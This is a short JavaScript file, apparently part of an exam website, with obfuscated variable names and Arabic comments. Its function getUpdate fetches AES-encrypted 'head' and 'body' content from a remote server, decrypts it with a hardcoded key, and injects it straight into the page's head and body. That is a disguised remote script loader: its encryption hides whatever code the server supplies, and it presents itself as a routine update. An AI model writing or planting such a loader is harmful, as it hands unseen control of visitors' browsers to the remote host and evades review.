function getUpdate() { 
    var _0xbc8fx2 = new XMLHttpRequest();
    _0xbc8fx2['onreadystatechange'] = function() { 
        if (this['readyState'] == 4 && this['status'] == 200) { 
            obj = JSON['parse'](this['responseText']);
            
            // Decryption logic remains, assuming crypto.js is available and functional
            fukhead = CryptoJS['AES']['decrypt'](obj['head'], 'F2cQx5iu8LKGQ');
            codeHead = fukhead.toString(CryptoJS['enc'].Utf8);
            codeHead = codeHead['replace'](/p1p2p3p4/gi, '\x0A');
            
            fukbody = CryptoJS['AES']['decrypt'](obj['body'], 'F2cQx5iu8LKGQ');
            codeBody = fukbody.toString(CryptoJS['enc'].Utf8);
            codeBody = codeBody['replace'](/p1p2p3p4/gi, '\x0A');
            
            $('#boody')['html']('');
            $('#boody')['append'](codeBody);
            $('head')['append'](codeHead);
        } else {} 
    };
    // تحديث الرابط هنا
    _0xbc8fx2['open']('GET', 'https://a0fxv8h5a8g0-deploy.space.z.ai/new_exam/version.php', true);
    _0xbc8fx2['send']();
}

// NOTE: إذا كان هذا الملف فارغًا في النسخة التي تعتمد عليها،
// يمكن إزالته أو تركه فارغًا. لكن بناءً على الهيكل الوظيفي الأصلي، هذا هو محتواه المعدل.
